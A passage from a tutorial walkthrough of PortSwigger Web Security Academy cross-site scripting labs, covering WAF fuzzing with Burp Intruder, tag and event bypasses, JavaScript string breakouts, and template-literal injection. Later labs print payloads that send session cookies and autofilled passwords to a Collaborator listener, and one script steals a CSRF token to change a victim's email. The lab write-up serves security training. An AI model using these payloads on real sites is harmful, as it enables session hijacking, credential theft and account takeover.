4. Notice the application throws an error (e.g., "Tag is not allowed"). The WAF caught us.

### **Step 2: Fuzz for Allowed Tags**

We need to find out which HTML tags the firewall allows.

1. In **Burp Proxy > HTTP History**, find your recent search request (e.g., `GET /?search=...`).
2. Right-click it and select **Send to Intruder**.
3. Go to the **Intruder** tab. Clear any auto-set payload positions by clicking **Clear §**.
4. Highlight your search term in the request and replace it exactly with: `<§§>`
    - *What this does:* We are telling Intruder to inject payloads exactly between the angle brackets (e.g., `<a>`, `<b>`, `<script>`).
5. Go to the **Payloads** tab.
6. Open PortSwigger's [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) in your browser and click **"Copy tags to clipboard"**.
7. Back in Burp, click **Paste** under the Payload settings to paste the list of tags.
8. Click **Start attack**.
9. **Analyze Results:** Sort the results by **Status Code**. Almost all will be `400 Bad Request` (blocked). However, you should see that the **`body`** tag returns a **200 OK**! The WAF allows `<body>`.

### **Step 3: Fuzz for Allowed Attributes (Events)**

Now we know `<body>` is allowed. But a body tag is useless without an event handler to execute JavaScript. Let's fuzz for events.

1. Go back to the **Positions** tab in Intruder.
2. Change your search term to: `<body %20§§=1>`
    - *What this does:* `%20` is a space. We are asking Intruder to test attributes like `<body onload=1>`, `<body onerror=1>`, etc.
3. Go to the **Payloads** tab. Click **Clear**.
4. Go back to the PortSwigger XSS Cheat Sheet and click **"Copy events to clipboard"**.
5. Paste the events into Burp's payload list.
6. Click **Start attack**.
7. **Analyze Results:** Sort by Status Code again. You will find that the **`onresize`** event returns a **200 OK**.

### **Step 4: Craft the Exploit Payload**

We have our puzzle pieces: the `<body>` tag and the `onresize` event.
Our payload needs to break out of the existing search attribute and inject our custom body tag.

1. **Raw Payload:** `"><body onresize=print()>`
2. **URL Encoded Payload:** Because we are going to send this via a link to a victim, we need to properly URL encode it so the browser doesn't break the link.
`%22%3E%3Cbody%20onresize=print()%3E`

### **Step 5: Automate the Trigger (The Heist)**

The lab states no user interaction is allowed. But the `onresize` event *only* fires when the browser window changes size. How do we resize the victim's browser without them clicking anything? **We put the vulnerable page inside an iframe and resize the iframe with code!**

1. Go to the **Exploit Server**.
2. In the **Body** section, paste the following:
    
    **HTML**
    
    `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'></iframe>`
    
    - *Explanation:* We load the vulnerable page (with our payload) inside an `<iframe>`. The `onload` attribute waits for the frame to finish loading, and then instantly changes its width to `100px`. This triggers the `onresize` event on the page inside, executing our `print()` function!
3. Click **Store**.
4. Click **Deliver exploit to victim**, and the lab is solved!

# **Lab 15 : Reflected XSS into HTML context with all tags blocked except custom ones**

### **The Core Concept**

This lab introduces **Custom HTML Tags** and the **Auto-Focus Trick**.

- **The Trap:** The Web Application Firewall (WAF) is extremely strict. It has a blacklist that blocks *every single standard HTML tag* (`<script>`, `<img>`, `<body>`, `<svg>`, etc.). If you try to fuzz it like the last lab, everything will come back as `400 Bad Request`.
- **The Loophole:** Modern web browsers are incredibly forgiving. If you invent a completely fake HTML tag (like `<hacker>` or `<xss>`), the browser will happily accept it and render it as a generic, invisible element. The WAF, meanwhile, only blocks *known* tags, so your fake tag slips right through!
- **The Trigger:** Since our custom tag is just an invisible box, nobody is going to click on it to trigger an `onclick` event. We need a "zero-click" execution. We achieve this by making the element "focusable", assigning it an `id`, and using the URL hash (`#`) to force the browser to focus on it the millisecond the page loads.

---

### **Step-by-Step Walkthrough**

You can complete this lab using the provided Exploit Server.

### **Step 1: Test the WAF Constraints**

If you want to verify the firewall's behavior manually:

1. Open the lab and search for a standard payload: `<img src=1 onerror=print()>` -> **Blocked**.
2. Search for a completely made-up tag: `<customTag>` -> **Allowed (200 OK)**.
3. *Result:* We know we have to build our exploit inside a custom tag.

### **Step 2: Build the Custom Tag Payload**

We need to construct a custom tag that executes JavaScript without any user interaction. Let's break down the anatomy of the perfect payload:

1. **The Tag:** `<xss>` (You can name this whatever you want).
2. **The Target ID:** `id="x"` (We need to name this specific element so we can point the browser to it later).
3. **The Focus Enabler:** `tabindex="1"` (By default, you can only "focus" on input fields or links. Adding a `tabindex` makes *any* HTML element focusable).
4. **The Event:** `onfocus="alert(document.cookie)"` (When the element receives focus, run our code).

**Raw Payload:** `<xss id=x onfocus=alert(document.cookie) tabindex=1>`

### **Step 3: The Auto-Focus Trick (The URL Hash)**

If we just inject that payload, it sits there invisibly. We need to force the browser to focus on it.
In standard web navigation, if you append `#section2` to a URL, the browser automatically scrolls down and *focuses* on the HTML element with `id="section2"`.

We will append `#x` to the end of our malicious search URL. The browser will load our injected `<xss id="x">` tag, see the `#x` in the URL, and immediately focus on it, triggering our `onfocus` event!

### **Step 4: Craft and Deliver the Exploit**

We need to force the victim to visit our maliciously crafted search URL.

1. Go to the **Exploit Server**.
2. In the **Body** section, we will write a tiny JavaScript script that redirects the victim's browser to our rigged URL.
    - *Note: The search parameter (`?search=...`) must be URL-encoded so it doesn't break the web address.*
3. Paste the following code:
    
    **HTML**
    
    `<script>
    location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
    </script>`
    
    *(Make sure to replace `YOUR-LAB-ID` with your actual lab instance URL).*
    
4. Click **Store**.
5. Click **Deliver exploit to victim**.
6. The victim hits your exploit server, gets redirected to the lab with the injected custom tag, the browser auto-focuses on `#x`, the `onfocus` event fires, their cookie is alerted, and the lab is solved!

# **Lab 16 : Reflected XSS with some SVG markup allowed**

### **The Core Concept**

This lab continues with **WAF Evasion via Fuzzing**, but introduces a specific, highly effective context: the `<svg>` tag.

- **The Problem for Defenders:** SVGs aren't just flat images; they are XML-based documents that have their own internal DOM (Document Object Model). Because of this, they support complex internal tags (like `<animatetransform>`, `<circle>`, `<polygon>`) and their own unique event handlers (like `onbegin`, `onend`).
- **The Exploit:** Web Application Firewalls (WAFs) often block standard HTML tags (`<script>`, `<body>`, `<img>`) and standard events (`onload`, `onerror`). However, they frequently forget to blacklist the obscure SVG-specific tags and events, leaving a wide-open door for attackers.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite's Intruder** tool for this lab to fuzz the WAF.

### **Step 1: Fuzz for Allowed Tags**

First, we need to find out what tags the WAF forgot to block.

1. Open the lab and search for a standard payload like `<img src=1 onerror=alert(1)>`. The WAF will block it (`400 Bad Request`).
2. In **Burp Proxy > HTTP History**, find the search request (e.g., `GET /?search=...`).
3. Right-click it and select **Send to Intruder**.
4. Go to the **Intruder** tab and click **Clear §** to remove default positions.
5. Change your search term to exactly this: `<§§>`
    - *We are telling Burp to test thousands of tag names inside those brackets.*
6. Open PortSwigger's [XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) in your browser, and click **Copy tags to clipboard**.
7. In Burp Intruder, go to the **Payloads** tab and click **Paste**.
8. Click **Start attack**.
9. **Analyze Results:** Sort by **Status Code**. Notice that almost everything is blocked (`400`), but a few SVG-related tags return a **200 OK**: `<svg>`, `<animatetransform>`, `<title>`, and `<image>`.

### **Step 2: Fuzz for Allowed Events (Attributes)**

Now we know `<svg>` and `<animatetransform>` are allowed. We need an event handler that triggers JavaScript execution.

1. Go back to the **Positions** tab in Intruder.
2. Change your search term to build off the allowed tags:
`<svg><animatetransform %20§§=1>`
    - *What this does:* We open the SVG, open the animation tag, add a space (`%20`), and ask Intruder to test all known event handlers here.
3. Go to the **Payloads** tab and click **Clear**.
4. Go back to the PortSwigger XSS Cheat Sheet and click **Copy events to clipboard**.
5. Click **Paste** in Burp's payload list.
6. Click **Start attack**.
7. **Analyze Results:** Sort by Status Code again. You will see that only the **`onbegin`** event gets a **200 OK**!

### **Step 3: Construct the Final Payload**

We have our raw materials: the `<svg>` wrapper, the `<animatetransform>` tag, and the `onbegin` event handler. Let's assemble them.

1. **Break out of the search attribute:** `">`
2. **Add the SVG wrapper:** `<svg>`
3. **Add the malicious animation tag:** `<animatetransform onbegin=alert(1)>`

**Raw Payload:** `"><svg><animatetransform onbegin=alert(1)>`

### **Step 4: Execute the Exploit**

1. Go back to your browser's address bar.
2. We need to URL-encode the payload so it travels safely over HTTP. Inject it into the `?search=` parameter:
`.../?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`*(Note: You can also just paste the raw payload `"><svg><animatetransform onbegin=alert(1)>` directly into the search box on the webpage and hit search, as modern browsers usually handle the encoding for you).*
3. As soon as the page loads, the browser parses the SVG, the animation "begins" instantly, and the `onbegin` event fires your JavaScript.
4. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 17 : Reflected XSS in canonical link tag**

### **The Core Concept**

This lab introduces **Attribute Injection using the `accesskey` Attribute**.

- **The Context:** The application reflects whatever is in your URL directly into a `<link rel="canonical">` tag in the page's `<head>`. Canonical links are used for SEO and are completely invisible to the user.
- **The Trap:** Angle brackets (`<` and `>`) are strictly encoded, meaning you cannot close the `<link>` tag to start a new `<script>` tag.
- **The Trick:** Even though the element is invisible, we can still add attributes to it! We use a special HTML attribute called `accesskey`. It lets a user press a specific keyboard shortcut to "click" or focus an element.
- **The Exploit:** We inject `accesskey="x"` (tying the invisible link to the "X" key) and `onclick="alert(1)"`. When the victim presses the keyboard shortcut for their browser/OS (like `ALT + SHIFT + X`), it triggers the `onclick` event, executing our JavaScript!

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely in your browser. *Note: As the lab instructions mention, the intended solution works best in Google Chrome.*

### **Step 1: Locate the Reflection**

First, we need to see exactly how our URL is being reflected into the HTML.

1. Open the lab home page.
2. Add a random query parameter to the end of the URL in your address bar: `/?test`
3. Hit **Enter** to load the page.
4. Right-click the page and select **View Page Source**.
5. Search (Ctrl+F) for `test`.
6. **Analyze:** You will find your input inside the `<head>` of the document, looking something like this:HTML
    
    `<link rel="canonical" href='https://YOUR-LAB-ID.web-security-academy.net/?test'/>`
    
    *Crucial observation:* Notice that the `href` attribute uses **single quotes** (`'`), not double quotes (`"`).
    

### **Step 2: Craft the Attribute Breakout**

Since we are trapped inside `href='...'`, we need to use a single quote to close the `href` attribute, add a space, and then inject our own attributes.

1. **Close the href:** `'`
2. **Add the accesskey:** `accesskey='x'`
3. **Add the event handler:** `onclick='alert(1)'`

**Raw Payload:** `' accesskey='x' onclick='alert(1)'`

*If we inject this, the HTML will look like:*`<link rel="canonical" href='https://.../?' accesskey='x' onclick='alert(1)'/>`

### **Step 3: URL Encode the Payload**

Because we are passing this payload directly in the URL address bar, we need to URL-encode the single quotes and spaces so the browser doesn't misinterpret them before sending them to the server.

- A single quote `'` becomes `%27`.
- A space becomes `%20` (or we can sometimes omit it if the browser forgives the syntax).

**Encoded Payload:** `%27accesskey=%27x%27onclick=%27alert(1)`

### **Step 4: Execute the Exploit**

1. Go back to your browser's address bar.
2. Replace everything after the `/` with your encoded payload:
`https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`
3. Hit **Enter** to load the page.
4. The payload is now injected into the page's source code, quietly waiting for the keyboard shortcut.
5. **Trigger the Payload:** Press the specific key combination for your operating system to activate the `accesskey="x"`:
    - **Windows (Chrome):** `ALT + SHIFT + X`
    - **MacOS (Chrome):** `CTRL + ALT + X`
    - **Linux (Chrome):** `ALT + X`
6. The browser interprets the shortcut as a click on the invisible canonical link. The `onclick` event fires, an alert box displaying "1" pops up, and the lab is solved!

# **Lab 18 : Reflected XSS into a JavaScript string with single quote and backslash escaped**

### **The Core Concept**

This lab introduces **Script Block Breakout**.

- **The Trap:** Your input is reflected inside a JavaScript variable: `var search = 'YOUR_INPUT';`.
- **The Defense:** The server is actively escaping single quotes (`'`) and backslashes (`\`). If you try to use the trick from our previous labs (like `'-alert(1)-'`), the server changes it to `\'-alert(1)-\'`, trapping your payload harmlessly inside the text string.
- **The Flaw:** The server forgot to encode angle brackets (`<` and `>`).
- **The Exploit:** Browsers parse HTML *before* they parse JavaScript. If you inject a closing `</script>` tag, the browser's HTML parser sees it, immediately stops reading the current JavaScript block (even though you are technically in the middle of a string), and returns to normal HTML mode. From there, you can just start a brand new `<script>` block of your own!

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Locate the Vulnerability**

Let's see where our input lands and test the server's defenses.

1. Open the lab.
2. Type a test string with a single quote into the search box: `test'payload`
3. Click **Search**.
4. Right-click the page and select **View Page Source** (or use Inspect).
5. Search the source code (Ctrl+F) for `test`.
6. **Analyze:** You will find your input inside a `<script>` block at the bottom of the page:JavaScript
    
    `<script>
        var searchTerms = 'test\'payload';
        // ... 
    </script>`
    
    Notice the backslash `\` before your single quote? The server neutralized your attempt to close the string.
    

### **Step 2: Craft the Exploit Payload**

Since we cannot break out of the single quotes, we will break out of the `<script>` tag itself.

1. **Close the existing script:** `</script>`*(This forcefully ends the developer's code right in the middle of the `searchTerms` variable declaration, causing a quiet background syntax error that we don't care about).*
2. **Start a new script:** `<script>`
3. **Add the payload:** `alert(1)`
4. **Close our new script:** `</script>`

**Final Payload:** `</script><script>alert(1)</script>`

### **Step 3: Execute the Exploit**

1. Go back to the search box on the webpage.
2. Paste your payload:HTML
    
    `</script><script>alert(1)</script>`
    
3. Click **Search**.
4. The browser reads the HTML, sees your injected `</script>`, closes the original block, opens your new one, and executes the JavaScript.
5. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

### **The Core Concept**

This lab revisits **JavaScript String Breakouts**, but with stricter server-side filters.

- **The Trap:** Your input lands inside a JavaScript string: `var search = 'YOUR_INPUT';`.
- **The Defense:** * Angle brackets (`< >`) are encoded, so you can't use `</script>` to break out of the HTML block.
    - Single quotes (`'`) are escaped with a backslash (`\'`), so `'-alert(1)-'` becomes `\'-alert(1)-\'`, trapping your payload as plain text.
- **The Flaw:** The server escapes single quotes by prepending a backslash, but it **forgets to escape backslashes themselves**.
- **The Exploit:** We inject our *own* backslash right before the single quote: `\'`. The server sees the single quote and adds its own backslash to protect it, resulting in `\\'`. In JavaScript, a double backslash (`\\`) evaluates to a single literal backslash character. Because the server's backslash was neutralized, our single quote is left unescaped and successfully closes the string!

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser or by using Burp Repeater to inspect the source code faster.

### **Step 1: Test the Constraints**

Let's verify exactly what the server is doing to our input.

1. Open the lab.
2. Type a test payload into the search box containing a single quote and a backslash: `test'payload\`
3. Click **Search**.
4. Right-click the page and select **View Page Source** (or use Inspect).
5. Search the source code (Ctrl+F) for `test`.
6. **Analyze:** You will find your input inside a `<script>` block:JavaScript
    
    `var searchTerms = 'test\'payload\';`
    
    *Observation 1:* The server added a `\` in front of our `'`.
    *Observation 2:* The server did **not** touch our trailing `\`. This is our loophole.
    

### **Step 2: Craft the Exploit Payload**

We need to use the backslash trick to break out, execute our code, and comment out the rest of the line so the script doesn't crash.

1. **The Breakout:** `\'`*(The server will turn this into `\\'`, effectively closing the string).*
2. **The Execution:** `alert(1)`*(We use the minus sign to separate our closed string from the function).*
3. **The Cleanup:** `//`*(This comments out the rest of the developer's original line, like the closing `';`)*

**Final Payload:** `\'-alert(1)//`

### **Step 3: Execute the Exploit**

1. Go back to the search box on the webpage.
2. Paste your payload:JavaScript
    
    `\'-alert(1)//`
    
3. Click **Search**.
4. **What happens on the backend:** The server processes your input and renders this JavaScript:
`var searchTerms = '\\'-alert(1)//';`
5. **What happens in the browser:** The browser's JavaScript engine reads `\\` as text, sees the `'` and closes the string, processes the  operator, executes the `alert(1)`, and ignores everything after the `//`.
6. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 20 : Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

### **The Core Concept**

This lab introduces **HTML Entity Decoding inside Attributes**.

- **The Trap:** You submit a website URL in a blog comment. The application takes your URL and puts it inside an `onclick` event handler, like this:
`<a id="author" onclick="var tracker='YOUR_WEBSITE'; ...">`
- **The Defense:** The backend is paranoid. It encodes `<` and `"` to stop HTML breakouts. It also escapes `'` (to `\'`) and `\` (to `\\`) to stop JavaScript string breakouts. If you type `'`, it becomes `\'`, trapping you. If you type `\'`, it becomes `\\\'`, still trapping you.
- **The Flaw (The "Aha!" Moment):** Your input exists in two contexts simultaneously: it's inside a **JavaScript string**, which is inside an **HTML attribute** (`onclick`).
- **The Exploit:** When a browser loads a page, the **HTML Parser runs first**. It reads the `onclick` attribute and *decodes any HTML entities* before handing the data over to the JavaScript engine.
If we send the HTML entity for a single quote (`&apos;`), the backend security filters ignore it (because it's just letters and an ampersand). But when the victim's browser renders the HTML, it decodes `&apos;` into a literal `'` *after* the backend defenses have finished. The JavaScript engine then receives a literal single quote, breaking the string!

---

### **Step-by-Step Walkthrough**

You can complete this lab using your browser, though Burp Repeater makes it easier to see the source code changes.

### **Step 1: Locate the Reflection**

1. Open the lab and click on any **Blog Post**.
2. Scroll down to the **Leave a comment** section.
3. Submit a benign test comment with a recognizable website:
    - **Comment:** `Test`
    - **Name:** `hello`
    - **Email:** `test@test.com`
    - **Website:** `http://hacker123.com`
4. Click **Post comment**, then click **Back to blog**.
5. Right-click your name (`hello`) on the comment and select **Inspect**.
6. **Analyze the HTML:** You will see something like this:HTML
    
    `<a id="author" href="#" onclick="var tracker='http://hacker123.com'; ...">Paakhi</a>`
    

### **Step 2: Understand the Constraints**

1. If you try to set your website to `http://hacker123.com'-alert(1)-'`, the server escapes the quotes. The HTML will render as:
`... onclick="var tracker='http://hacker123.com\'-alert(1)-\''; ..."`*(The JavaScript engine sees escaped quotes and treats them as safe text).*

### **Step 3: Craft the Bypass Payload**

We will use HTML entities to sneak past the backend filter, knowing the browser's HTML parser will decode them for us on the front end.

1. **Start with a valid URL:** The website field requires a valid URL format, so start with `http://foo?`
2. **Inject the HTML Entity:** Use `&apos;` instead of `'` to close the JavaScript string.
3. **Add the Execution:** `alert(1)-`
4. **Close the logic:** Add another `&apos;` to balance the syntax.

**Final Payload:** `http://foo?&apos;-alert(1)-&apos;`

### **Step 4: Execute the Exploit**

1. Scroll back down to the **Leave a comment** section.
2. Submit your malicious comment:
    - **Comment:** `Click my name!`
    - **Name:** `Admin`
    - **Email:** `admin@test.com`
    - **Website:** `http://foo?&apos;-alert(1)-&apos;` *(Paste the payload here)*
3. Click **Post comment** and return to the blog.
4. **What happens in the background:** The server saves `&apos;` exactly as you wrote it.
5. **Trigger the Payload:** Scroll down and click on your author name (**Admin**).
6. *Boom.* When you click, the browser parses the HTML, turns `&apos;` into `'`, hands it to JavaScript, and JavaScript executes `var tracker='http://foo?'-alert(1)-'';`.
7. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 21: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

### **The Core Concept**

This lab introduces **Template Literal Injection (String Interpolation)**.

- **The Trap:** Your input lands inside a modern JavaScript template literal. These are strings enclosed in **backticks** (```) instead of normal quotes (`'` or `"`).
- **The Defense:** The backend has locked this down tight. Angle brackets are encoded. Every type of quote (`'`, `"`, ```) and the backslash (`\`) are Unicode-escaped. You absolutely **cannot** break out of the backticks to start writing new JavaScript.
- **The Flaw:** Template literals have a superpower called **string interpolation**. They allow developers to execute JavaScript expressions directly *inside* the string using the `${expression}` syntax.
- **The Exploit:** The server forgot to sanitize the dollar sign (`$`) and curly braces (`{}`). Because of this, we don't need to break out of the string at all! We just use the template literal's own feature to execute our code from the inside.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely within your browser.

### **Step 1: Locate the Reflection**

Let's see exactly how the application handles your input.

1. Open the lab.
2. Type a unique test string into the search box: `testpayload`
3. Click **Search**.
4. Right-click the page and select **View Page Source** (or use Inspect).
5. Search the source code (Ctrl+F) for `testpayload`.
6. **Analyze:** You will find your input inside a `<script>` block, wrapped in backticks:JavaScript
    
    `var message = `0 search results for 'testpayload'`;
    document.getElementById('searchMessage').innerText = message;`
    

### **Step 2: Test the Constraints**

If you want to see the server's defenses in action:

1. Try searching for: `< > ' " \`  `
2. Look at the source code again. You will see something like:JavaScript
    
    `var message = `0 search results for '&lt; &gt; \u0027 \u0022 \u005c \u0060'`;`
    
    The server neutralized every character you would normally use to escape a string or an HTML tag.
    

### **Step 3: Craft the Payload**

Since we are trapped inside the backticks, we will use the `${}` syntax to evaluate an expression.

When JavaScript sees `${alert(1)}` inside a template literal, it pauses, executes the `alert(1)` function, takes the result of that function, and places it into the string.

**Final Payload:** `${alert(1)}`

### **Step 4: Execute the Exploit**

1. Go back to the search box on the webpage.
2. Paste your payload:JavaScript
    
    `${alert(1)}`
    
3. Click **Search**.
4. **What happens in the browser:** The server renders `var message =` 0 search results for '${alert(1)}'`;`. The browser's JavaScript engine evaluates the template literal, encounters the `${...}`block, and executes the`alert\` function.
5. An alert box displaying "1" will pop up, and the lab is solved!

# **Lab 22 : Exploiting cross-site scripting to steal cookies**

### **The Core Concept**

This lab moves beyond discovering vulnerabilities and enters **Weaponization**.

- **The Vulnerability:** The blog comments section has a standard Stored XSS vulnerability. Anything we put in the comment box gets saved and rendered for every visitor.
- **The Goal:** We want to steal the administrator's session cookie. If we have their cookie, the server thinks *we* are the admin.
- **The Exploit:** Instead of popping an alert, we write a JavaScript payload that quietly reads the victim's cookie (`document.cookie`) and uses the `fetch()` API to send it as a background HTTP POST request to a server we control.
- **The Tool:** We use **Burp Collaborator** as our listener to catch the incoming cookie.

*(Note: Because of the lab's strict firewall rules, you must use Burp Collaborator, which is a Burp Suite Professional feature, to catch the cookie out-of-band).*

---

### **Step-by-Step Walkthrough**

### **Step 1: Set up your Listener (Burp Collaborator)**

First, we need a server address to send the stolen cookies to.

1. Open **Burp Suite Professional**.
2. Go to the **Collaborator** tab.
3. Click **Copy to clipboard** to generate your unique payload URL (it will look something like `xyz123.oastify.com`).

### **Step 2: Craft the Weaponized Payload**

We need a script that grabs the cookie and sends it to your Collaborator URL.

1. We will use the native JavaScript `fetch()` function.
2. We set the method to `POST` so we can send data in the body.
3. We set `mode: 'no-cors'` to prevent the browser from blocking the request due to Cross-Origin Resource Sharing (CORS) policies.
4. We set the `body` to `document.cookie`.

**Final Payload:**

HTML

`<script>
fetch('https://YOUR-COLLABORATOR-SUBDOMAIN.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>`

*(Make sure to replace the URL with your actual copied Collaborator address!)*

### **Step 3: Plant the Trap**

1. Open the lab and click on any **Blog Post**.
2. Scroll down to the **Leave a comment** section.
3. Paste your weaponized payload into the **Comment** box.
4. Fill in fake details for Name, Email, and Website.
5. Click **Post comment**.
6. The trap is now set. The simulated "victim" (an automated bot acting as the administrator) constantly browses the blog posts. As soon as it views your comment, your script will execute in its browser.

### **Step 4: Catch the Cookie**

1. Go back to Burp Suite and open the **Collaborator** tab.
2. Click **Poll now**.
3. You should see a new HTTP interaction appear in the list! (If you don't see it, wait 10 seconds and click Poll now again).
4. Click on the interaction and look at the **Request** pane.
5. In the body of the POST request, you will see the victim's stolen session cookie: `session=...`
6. Copy the value of that session cookie.

### **Step 5: Execute the Account Takeover (Session Hijacking)**

Now we use the stolen cookie to impersonate the administrator.

1. Go back to your web browser and navigate to the lab's home page.
2. Open your browser's **Developer Tools** (Right-click -> Inspect).
3. Go to the **Application** tab (in Chrome/Edge) or **Storage** tab (in Firefox).
4. On the left sidebar, expand **Cookies** and click on the lab's URL.
5. Find the cookie named `session`. Double-click its **Value** and paste the victim's cookie you just stole.
6. Refresh the web page.
7. You are now logged in as the administrator! The lab will instantly be marked as solved.

# **Lab 23: Exploiting cross-site scripting to capture passwords**

### **The Core Concept**

This lab demonstrates an incredibly clever and realistic attack vector: **Weaponizing XSS against Password Managers**.

- **The Vulnerability:** The blog comments section has a Stored XSS vulnerability.
- **The Goal:** Steal the victim's actual username and password, not just their session cookie.
- **The Exploit (The Autofill Trap):** Many users (and the simulated victim in this lab) use browser password managers. If a password manager sees a username and password field on a page where it has saved credentials, it will often **automatically fill them in**.
We will use our Stored XSS to inject fake login fields into the comment section. When the victim views the comment, their password manager will blindly drop their credentials into our fake fields. We then attach an `onchange` event to those fields to instantly grab the filled data and send it to our server.

*(Note: Just like the last lab, you must use Burp Collaborator to catch the exfiltrated data).*

---

### **Step-by-Step Walkthrough**

### **Step 1: Set up your Listener (Burp Collaborator)**

We need our drop server ready to catch the stolen credentials.

1. Open **Burp Suite Professional**.
2. Go to the **Collaborator** tab.
3. Click **Copy to clipboard** to generate your unique payload URL.

### **Step 2: Craft the Weaponized HTML/JS**

Unlike previous labs where we just injected `<script>` tags, here we are injecting actual HTML structural elements alongside our JavaScript.

1. **Create the fake fields:** We create a text input for the username and a password input for the password.
2. **Attach the listener:** We use the `onchange` attribute on the password field. This tells the browser: *"The moment this field's value changes (i.e., when the password manager autofills it), run this code."*
3. **The Exfiltration:** Inside the `onchange` event, we use `fetch()` to send a POST request to our Collaborator server containing the username and password values.

**Final Payload:**

HTML

`<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-COLLABORATOR-SUBDOMAIN.oastify.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">`

*(Make sure to replace the URL with your actual copied Collaborator address!)*

### **Step 3: Plant the Trap**

1. Open the lab and navigate to any **Blog Post**.
2. Scroll down to the **Leave a comment** section.
3. Paste your weaponized HTML/JS payload into the **Comment** box.
4. Fill in dummy data for Name, Email, and Website.
5. Click **Post comment**.
6. Now we wait. The simulated victim (the administrator) will view the comment page, their browser will render your fake inputs, and their password manager will autofill them, triggering the `onchange` event.

### **Step 4: Catch the Credentials**

1. Go back to Burp Suite and open the **Collaborator** tab.
2. Click **Poll now**.
3. You should see a new HTTP interaction appear.
4. Click the interaction and look at the **Request** pane.
5. In the body of the POST request, you will see the administrator's stolen credentials formatted as `administrator:password123` (or similar).
6. Note down that username and password.

### **Step 5: Account Takeover**

1. Go back to the lab in your web browser.
2. Click **My account** at the top right of the page.
3. Log in using the stolen administrator credentials.
4. The lab will instantly be marked as solved!

# **Lab 24 : Exploiting XSS to bypass CSRF defenses**

### **The Core Concept**

This lab demonstrates why **Cross-Site Request Forgery (CSRF) tokens are useless if a site is vulnerable to XSS**.

- **The Defense:** A CSRF token is a secret, unpredictable string the server requires before it accepts a state-changing action (like changing a password or email). An external attacker normally can't forge a request because they can't guess this token.
- **The Flaw:** The blog has a Stored XSS vulnerability.
- **The Exploit:** Because XSS runs *inside* the victim's browser, on the same domain as the target application, it bypasses the Same-Origin Policy. Our script can act exactly like the user. It can quietly request the account page, read the secret CSRF token out of the HTML, and then immediately use that token to submit a valid request to change the email address.

---

### **Step-by-Step Walkthrough**

You can complete this lab entirely in your browser.

### **Step 1: Understand the Target Mechanism**

First, we need to see exactly what a legitimate "change email" request looks like.

1. Open the lab and log in as `wiener` / `peter`.
2. Go to **My account**.
3. Right-click the page and select **View Page Source** (or Inspect the email form).
4. **Analyze the Form:** You will see a form submitting a `POST` request to `/my-account/change-email`. Inside that form, there is a hidden input containing the CSRF token:
`<input required type="hidden" name="csrf" value="YOUR_TOKEN_HERE">`
5. *Our script will need to find this exact line of HTML and extract that value.*

### **Step 2: Craft the Exploit Logic**

We need to write a two-stage JavaScript payload using `XMLHttpRequest` (or the newer `fetch` API, but we'll use the lab's suggested XHR method for compatibility).

**Stage 1: Fetch the Account Page**
We tell the browser to quietly load `/my-account` in the background.

JavaScript

`var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();`

**Stage 2: Read the Token and Attack**
Once the page loads, the `handleResponse` function triggers. It uses a Regular Expression (Regex) to search the raw HTML for the CSRF token. Once it finds it, it fires a `POST` request to change the email.

JavaScript

`function handleResponse() {
    // 1. Find the CSRF token using Regex
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    
    // 2. Build the malicious POST request
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    
    // 3. Send the stolen token and our attacker email
    changeReq.send('csrf='+token+'&email=hacker@evil.com')
};`

### **Step 3: Plant the Trap**

We need to put this entire script into a Stored XSS payload so the simulated victim executes it.

1. Combine the code from Step 2 and wrap it in `<script>` tags.
2. Go to the lab's home page and click on any **Blog Post**.
3. Scroll down to the **Leave a comment** section.
4. Paste your weaponized payload into the **Comment** box:HTML
    
    `<script>
    var req = new XMLHttpRequest();
    req.onload = handleResponse;
    req.open('get','/my-account',true);
    req.send();
    function handleResponse() {
        var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
        var changeReq = new XMLHttpRequest();
        changeReq.open('post', '/my-account/change-email', true);
        changeReq.send('csrf='+token+'&email=hacker@evil.com')
    };
    </script>`
    
5. Fill in dummy data for Name, Email, and Website.
6. Click **Post comment**.

### **Step 4: Execute and Solve**

1. Click **Back to blog**.
2. The simulated victim (the administrator) is constantly browsing the blog posts. As soon as their browser loads your comment, your script executes silently in the background.
3. It fetches their account page, steals their unique CSRF token, and changes their email address to `hacker@evil.com`.
4. The lab will verify the email change and mark itself as solved!

# **Lab 25 : Reflected XSS with AngularJS sandbox escape without strings**

### **The Core Concept**

This lab introduces **Advanced AngularJS Sandbox Evasion via Prototype Manipulation**.

- **The Sandbox:** Older versions of AngularJS (up to 1.5.x) use a "sandbox" to parse expressions (the code inside `{{ }}`). The sandbox's job is to ensure you can only do basic math and variable lookups, preventing you from accessing the raw `window` object or calling dangerous functions like `alert()`.
- **The Constraints:** 1. The standard `$eval` function (often used to break the sandbox) is disabled.
2. You **cannot use strings** (no `'` or `"` allowed).
- **The Exploit Strategy:** 1. **Get a String without Quotes:** We use native JavaScript methods like `toString()` to generate a string object.
